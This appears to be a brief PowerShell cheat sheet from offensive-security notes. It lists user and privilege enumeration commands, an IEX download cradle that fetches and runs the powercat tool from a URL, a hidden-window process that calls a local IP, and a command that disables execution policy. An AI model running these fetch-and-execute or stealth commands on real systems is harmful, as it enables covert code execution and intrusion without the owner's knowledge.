
### Load a `ps1` module:
```
Load The Function From Downloaded .ps1 File:
	. .\powercat.ps1
OR
	Import-Module .\powercat.ps1
	
Load The Function From URL:
    IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')

```

### Sudo or switch user:
see [[sudo]]

### Create a file
```powershell
New-Item <filename.filetype>
echo $null >> filename.type
```

### To display a list of cmdlets contained in a specific module
```powershell
Get-Command -Module <module name>
# example for windows defender
Get-Command -Module Defender
```

### Need help about a command ?
```powershell
Get-Help <Command> –Full
```

### Need usage example ?
```powershell
Get-Help <Command> -Examples
```

### Disable execution policy
> Need admin privileges

```powershell
Set-ExecutionPolicy -ExecutionPolicy Unrestricted
```

#### Execute a powershell command in a new process (stealthy : no window)
```powershell
Start-Process "powershell" -WindowStyle Hidden -ArgumentList "curl http://192.168.0.17:8000/"
```

#### Get hostname:
```powershell
hostname
```
#### List users
```powershell
net user
```
#### Get user info
```powershell
net user administrator
```
#### Get current user name
```powershell
whoami
```
#### Get user groups
```powershell
whoami /groups
```
#### Get user privileges
```powershell
whoami /priv
```
#### Get user name
```powershell
whoami
```